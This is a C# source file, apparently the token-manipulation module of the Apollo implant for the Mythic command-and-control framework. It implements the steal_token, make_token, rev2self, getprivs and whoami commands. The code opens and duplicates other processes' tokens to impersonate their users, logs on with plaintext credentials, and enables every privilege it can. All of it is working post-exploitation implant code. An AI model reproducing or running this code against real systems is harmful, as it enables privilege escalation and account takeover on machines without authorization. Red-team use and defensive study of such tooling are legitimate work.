#define COMMAND_NAME_UPPER

#if DEBUG
#undef MAKE_TOKEN
#undef STEAL_TOKEN
#undef REV2SELF
#undef GETPRIVS
#undef WHOAMI
#define MAKE_TOKEN
#define STEAL_TOKEN
#define REV2SELF
#define GETPRIVS
#define WHOAMI
#endif

#if MAKE_TOKEN || STEAL_TOKEN || REV2SELF || GETPRIVS || WHOAMI

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using Apollo.Jobs;
using Mythic.Structs;
using Apollo.Credentials;
using static Utils.StringUtils;
using static Native.Methods;
using static Native.Enums;
using static Native.Structures;
using Apollo.Tasks;

namespace Apollo.CommandModules
{
    public class TokenManager
    {
        public struct MakeTokenParameter
        {
            public MythicCredential credential;
        }

        /// <summary>
        /// Steal, make, or revert a token based
        /// on the job.Task.command.
        /// </summary>
        /// <param name="job">Job associated with this task.</param>
        /// <param name="agent">Agent associated with this task.</param>
        public static void Execute(Job job, Agent agent)
        {
            Task task = job.Task;
            switch (task.command)
            {
#if STEAL_TOKEN
                case "steal_token":
                    StealToken(job);
                    break;
#endif
#if MAKE_TOKEN
                case "make_token":
                    MakeToken(job);
                    break;
#endif
#if REV2SELF
                case "rev2self":
                    Revert(job);
                    break;
#endif
#if GETPRIVS
                case "getprivs":
                    GetPrivs(job);
                    break;
#endif
#if WHOAMI
                case "whoami":
                    string message = "{0} for local operations, {1} for remote operations.";
                    message = string.Format(message, CredentialManager.CurrentIdentity.Name, CredentialManager.GetCurrentUsername());
                    job.SetComplete(message);
                    break;
#endif
                default:
                    job.SetError($"Unknown command: {task.command}");
                    break;
            }

        }

#if MAKE_TOKEN
        /// <summary>
        /// Create a token based on the task.@params passed.
        /// </summary>
        /// <param name="task">Task that holds a Cred JSON dict with the proper values to spawn the process.</param>
        public static void MakeToken(Job j)
        {
            var task = j.Task;
            MakeTokenParameter parameters = JsonConvert.DeserializeObject<MakeTokenParameter>(task.parameters);

            MythicCredential cred = parameters.credential;

            
            if (string.IsNullOrEmpty(cred.account) || string.IsNullOrEmpty(cred.credential))
            {
                j.SetError("Username and password are required for make_token.");
                return;
            }

            if (cred.credential_type != "plaintext")
            {
                j.SetError($"make_token can only be used with plaintext credentials, and was given credentials of type {cred.credential_type}");
                return;
            }


            string userFQDN = cred.account;
            if (!string.IsNullOrEmpty(cred.realm))
            {
                userFQDN = cred.realm + "\\" + userFQDN;
            }
            else
            {
                userFQDN = ".\\" + userFQDN;
            }

            if (!CredentialManager.SetCredential(cred.account, cred.credential, cred.realm))
            {
                j.SetError($"Failed to make_token with {userFQDN}:{cred.credential}\n\t:Error Code: {Marshal.GetLastWin32Error()}");
                return;
            }

            try
            {
                j.SetComplete($"Successfully impersonated {CredentialManager.GetCurrentUsername()}");
            }
            catch (Exception ex)
            {
                j.SetError($"Unknown error: {ex.Message}\nStackTrace{ex.StackTrace}");
            }
        }
#endif

#if GETPRIVS
        public static void GetPrivs(Job j)
        {
            var task = j.Task;
            try
            {
                string[] privs = CredentialManager.EnableAllPrivileges();
                string message = "Enabled {0} privileges for {1}:\n\n{2}";
                message = string.Format(message, privs.Length, CredentialManager.GetCurrentUsername(), string.Join("\n", privs));
                j.SetComplete(message);
            }
            catch (Exception ex)
            {
                j.SetError($"Failed to enable privileges. Reason: {ex.Message} (GetLastError(): {Marshal.GetLastWin32Error()}");
            }
        }
#endif
#if STEAL_TOKEN
        /// <summary>
        /// Steal a token from a specified process. If the process
        /// specified by task.@params is null, it will steal the
        /// token for winlogon.exe
        /// </summary>
        /// <param name="task">Task with the PID of the process token to steal, located in task.@params</param>
        public static void StealToken(Job j)
        {
            var task = j.Task;
            try
            {
                int procId;
                IntPtr procHandle;
                IntPtr hStolenToken;
                try
                {
                    procHandle = System.Diagnostics.Process.GetProcessById((int)Convert.ToInt32(task.parameters)).Handle;
                }
                catch (Exception ex)
                {
                    j.SetError($"Failed to acquire handle to process {task.parameters}. Reason: {ex.Message}");
                    return;
                }
                //if (task.parameters == "" || task.parameters == null)
                //{
                //    System.Diagnostics.Process winlogon = System.Diagnostics.Process.GetProcessesByName("winlogon")[0];
                //    procHandle = winlogon.Handle;
                //    Debug.WriteLine("[+] StealToken - Got handle to winlogon.exe at PID: " + winlogon.Id);
                //}
                //else
                //{
                //    procId = Convert.ToInt32(task.parameters);
                //    procHandle = System.Diagnostics.Process.GetProcessById(procId).Handle;
                //    Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);
                //}

                try
                {
                    // Stores the handle for the original process token
                    hStolenToken = IntPtr.Zero; // Stores the handle for our duplicated token

                    // Get handle to target process token
                    bool bRet = OpenProcessToken(
                        procHandle,                                 // ProcessHandle
                        (uint)(TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary | TokenAccessLevels.Query),     // desiredAccess
                        out IntPtr tokenHandle);                           // TokenHandle

                    if (!bRet)
                    {
                        j.SetError($"Failed to open process token: {Marshal.GetLastWin32Error()}");
                        return;
                    }// Check if OpenProcessToken was successful

                    if (!CredentialManager.SetImpersonatedPrimaryToken(tokenHandle))
                    {
                        j.SetError($"Failed to set new primary token: {Marshal.GetLastWin32Error()}");
                    }

                    try
                    {
                        // Duplicate token as stolenHandle
                        bRet = DuplicateTokenEx(
                            tokenHandle,                                    // hExistingToken
                            TokenAccessLevels.MaximumAllowed, /*.TOKEN_QUERY | TokenAccessRights.TOKEN_DUPLICATE | TokenAccessRights.TOKEN_ASSIGN_PRIMARY,*/         // dwDesiredAccess
                            IntPtr.Zero,                                    // lpTokenAttributes
                            TokenImpersonationLevel.Impersonation,    // ImpersonationLevel
                            TOKEN_TYPE.TokenImpersonation,         // TokenType
                            out hStolenToken);                              // phNewToken


                        // end testing
                        if (!bRet) // Check if DuplicateTokenEx was successful
                        {
                            task.status = "error";
                            task.message = $"Failed to duplicate token handle: {Marshal.GetLastWin32Error()}";
                            return;
                        }

                        if (!CredentialManager.SetImpersonatedImpersonationToken(hStolenToken))
                        {
                            j.SetError($"Failed to impersonate user. Reason: {Marshal.GetLastWin32Error()}");
                        }
                        else
                        {
                            WindowsIdentity ident = new WindowsIdentity(hStolenToken);
                            j.SetComplete($"Successfully impersonated {ident.Name}");
                            ident.Dispose();
                        }
                    }
                    catch (Exception e) // Catch errors thrown by DuplicateTokenEx
                    {
                        j.SetError("[!] StealToken - ERROR duplicating token: " + e.Message);
                    }
                }
                catch (Exception e) // Catch errors thrown by OpenProcessToken
                {
                    j.SetError($"Failed to steal token. Reason: {e.Message}");
                }
            }
            catch (Exception e) // Catch errors thrown by Process.GetProcessById
            {
                j.SetError("[!] StealToken - ERROR creating process handle: " + e.Message);
            }
        }
#endif

#if REV2SELF

        public static void Revert(Job j)
        {
            var task = j.Task;
            if (CredentialManager.RevertToSelf())
            {
                j.SetComplete($"Reverted to implant primary token ({CredentialManager.GetCurrentUsername()})");
            }
            else
            {
                j.SetError($"Unknown error when reverting to self. Last error: {Marshal.GetLastWin32Error()}");
            }
        }
#endif
    }
}
#endif